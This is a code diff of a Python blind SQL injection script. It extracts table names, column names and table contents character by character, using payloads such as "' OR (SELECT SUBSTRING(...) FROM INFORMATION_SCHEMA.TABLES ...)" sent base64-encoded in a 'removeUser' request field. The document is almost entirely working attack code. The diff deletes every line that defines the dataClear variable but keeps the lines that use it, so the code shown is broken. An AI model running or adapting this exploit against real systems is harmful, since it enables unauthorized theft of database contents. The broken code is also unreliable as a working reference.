@@ -587,7 +587,6 @@ json_data_add = json.dumps(encode_data_add);
 length_table=0
 while True:
     payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()) = {length_table} ; ##"
-    dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
     encoded_data = base64.b64encode(dataClear.encode()).decode()
     data = {
         "data": encoded_data
@@ -607,7 +606,6 @@ table_string=""
 for i in range(1,length_table+1):
     for char in list_wordlist:
         payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()), {i}, 1) = '{char}') ; ##"
-        dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
         encoded_data = base64.b64encode(dataClear.encode()).decode()
         data = {
             "data": encoded_data
@@ -631,7 +629,6 @@ for table_child in table:
     lenght_colums=0
     while True:
         payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_child}') = {lenght_colums} ; ##"
-        dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
         encoded_data = base64.b64encode(dataClear.encode()).decode()
         data = {
             "data": encoded_data
@@ -652,7 +649,6 @@ for table_child in table:
     for i in range(1,lenght_colums+1):
         for char in list_wordlist:
             payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_child}'), {i}, 1) = '{char}') ; ##"
-            dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
             encoded_data = base64.b64encode(dataClear.encode()).decode()
             data = {
                 "data": encoded_data
@@ -673,7 +669,6 @@ for table_child in table:
     lenght_content_table=0
     while True:
         payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT({columns[0]})) FROM {table_child}) = {lenght_content_table} ; ##"
-        dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
         encoded_data = base64.b64encode(dataClear.encode()).decode()
         data = {
             "data": encoded_data
@@ -694,7 +689,6 @@ for table_child in table:
     for i in range(1,lenght_content_table+1):
         for char in list_wordlist:
             payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT({columns[0]})) FROM {table_child}), {i}, 1) = '{char}') ; ##"
-            dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
             encoded_data = base64.b64encode(dataClear.encode()).decode()
             data = {
                 "data": encoded_data
